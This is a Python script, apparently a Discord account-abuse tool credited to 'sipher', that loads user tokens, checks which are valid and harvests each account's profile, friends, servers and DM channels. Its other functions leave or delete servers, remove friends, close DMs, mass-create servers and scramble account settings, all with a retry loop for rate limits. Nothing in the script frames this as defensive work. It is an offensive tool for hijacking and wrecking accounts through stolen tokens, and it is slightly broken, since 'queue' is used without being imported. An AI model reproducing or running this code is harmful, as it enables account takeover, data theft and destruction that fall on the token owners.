import threading, colorama, requests, ctypes, time, json, sys, os, random
from colorama import Fore
import datetime
colorama.init()
def date_send(text):
    print(f"[{Fore.GREEN}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}] {text}")
def multi_clearer():
    if sys.platform.startswith("win"):
        os.system("cls")
    else:
        os.system("clear")
def stable():
    try:
        os_name = os.environ['COMPUTERNAME']
    except:
        os_name = random.choice(['NotII','Pre','Sipher'])
    return os_name
def title(text):
    ctypes.windll.kernel32.SetConsoleTitleW(f"{text} || by sipher :3")
def collection(token, data, xd):
    headers = {'Authorization' : token}
    src = requests.get("https://canary.discord.com/api/v6/users/@me", headers=headers, timeout=10).json()
    friends = requests.get("https://canary.discord.com/api/v6/users/@me/relationships", headers=headers, timeout=10).json()
    servers = requests.get('https://canary.discord.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()
    dm_channels = requests.get('https://canary.discord.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()
    data[token] = {}
    data[token]['info'] = src
    data[token]["friends"] = friends
    data[token]["servers"] = servers
    data[token]["dm_channels"] = dm_channels
    xd.acquire()
    date_send(f"Stored data for {Fore.GREEN}{token}{Fore.RESET}...")
    xd.release()
def token_checker(token, valid, stable):
    headers= {"Authorization": token}  
    src = requests.get('https://canary.discord.com/api/v6/users/@me/relationships', headers=headers, timeout=10)
    if src.status_code == 401 or src.status_code == 404:
        stable.acquire()
        date_send(f"{Fore.RED}{token} (Invalid){Fore.RESET}")
        stable.release()
    elif src.status_code == 403:
        stable.acquire()
        date_send(f"{Fore.RED}{token} (Phonelocked){Fore.RESET}")
        stable.release()
    else:
        if token in valid:
            stable.acquire()
            date_send(f"{Fore.RED}{token} (Duplicate token){Fore.RESET}")
            stable.release()
        else:
            stable.acquire()
            valid.append(token)
            date_send(f"{Fore.GREEN}{token} (Valid){Fore.RESET}")
            stable.release()
def ui(tokens):
    print(Fore.CYAN + f"""


 ██ ▄█▀▄▄▄       ██▓▄▄▄█████▓ ▒█████     
 ██▄█▒▒████▄    ▓██▒▓  ██▒ ▓▒▒██▒  ██▒   
▓███▄░▒██  ▀█▄  ▒██▒▒ ▓██░ ▒░▒██░  ██▒   by sipher#6670
▓██ █▄░██▄▄▄▄██ ░██░░ ▓██▓ ░ ▒██   ██░   {len(tokens)} token(s) loaded! Token's listed below:
▒██▒ █▄▓█   ▓██▒░██░  ▒██▒ ░ ░ ████▓▒░   
▒ ▒▒ ▓▒▒▒   ▓▒█░░▓    ▒ ░░   ░ ▒░▒░▒░    
░ ░▒ ▒░ ▒   ▒▒ ░ ▒ ░    ░      ░ ▒ ▒░    
░ ░░ ░  ░   ▒    ▒ ░  ░      ░ ░ ░ ▒     
░  ░        ░  ░ ░               ░ ░     
                                         
""" + Fore.RESET)
################################ CLASSES FOR THREADING #####################################
class Worker(threading.Thread):
    def __init__(self, tasks):
        threading.Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except:
                pass
            finally:
                self.tasks.task_done()
class Sipher:
    def __init__(self, num_threads):
        self.tasks = queue.Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        self.tasks.join()
################################## DISCORD FUNCTIONS ##############################################
def leave_guild(token,id):
    headers= {"Authorization": token}  
    while True:
        src = requests.delete(f'https://canary.discord.com/api/v6/users/@me/guilds/{id}', headers=headers ,timeout=20)
        print(src.text)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
def delete_guild(headers,id): 
    while True:
        src = requests.post(f'https://canary.discord.com/api/v8/guilds/{id}/delete', headers=headers ,timeout=20)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
def remove_friend(id,headers):
    while True:
        src = requests.delete(f"https://canary.discord.com/api/v6/users/@me/relationships/{str(id)}", headers=headers, timeout=10)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
def create_guild(name,headers):
    payload = {"name": name}
    while True:
        src = requests.post(f'https://canary.discord.com/api/v6/guilds', headers=headers, json=payload, timeout=10)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
def close(id,headers):
    while True:
        src = requests.delete(f"https://canary.discord.com/api/v6/channels/{id}", headers=headers, timeout=10)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
def glitch(headers):
    payload = {
        'theme': "dark",
        'locale': "ja",
        'message_display_compact': False,
        'enable_tts_command': False,
        'inline_embed_media': True,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    requests.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload, timeout=10)
